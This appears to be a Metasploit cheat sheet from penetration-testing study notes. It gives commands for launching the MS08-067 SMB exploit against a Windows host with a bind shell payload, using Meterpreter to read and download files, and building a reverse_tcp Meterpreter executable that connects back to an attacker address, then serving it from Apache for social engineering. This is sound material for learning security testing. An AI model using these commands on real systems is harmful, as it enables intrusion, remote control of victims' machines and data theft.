# Metasploit

## Search
search does string searches

```bash
search ms08
```

returns searches for all modules with `ms08` in the name

### Get info about a module

```
info exploit/windows/smb/ms08_067_netapi
```

### Exploits

```bash
show exploits
```

## Select a module
Usually following a `search`, you can `select` from the search results by index

```bash
select 6
```

## Show options
```bash
show options
```

## Setting options
`set` an option from the module's options

```bash
set RHOSTS 10.0.1.97
```

## Show payloads
`show payloads` shows all payloads associated with a module

## Run a payload
`run` runs all selected payloads for the given module

## Run an exploit
```bash
exploit
```

## Meterpreter

```bash
ls
```

```bash
cat file.ext
```

```bash
download file.ext
```


## Metasploit CLI

`root@kali:~# msfcli windows/smb/ms08_067_netapi O`

`root@kali:~# msfcli windows/smb/ms08_067_netapi RHOST=192.168.20.10 PAYLOAD=windows/shell_bind_tcp E`

## MSFVenom
Build custom exploits for social engineering etc. 

To list all the available payloads, enter `msfvenom -l payloads`

`root@kali:~# msfvenom -p windows/meterpreter/reverse_tcp -o`

`root@kali:~# msfvenom --help-formats`

To select the output format, use the -f option along with the chosen
format:
`msfvenom windows/meterpreter/reverse_tcp LHOST=192.168.20.9 LPORT=12345 -f exe`

Redirect the output to an executable file, example.exe:
`root@kali:~# msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.20.9 LPORT=12345 -f exe > example.exe`

`root@kali:~# cp example.exe /var/www`

`root@kali:~# service apache2 start`

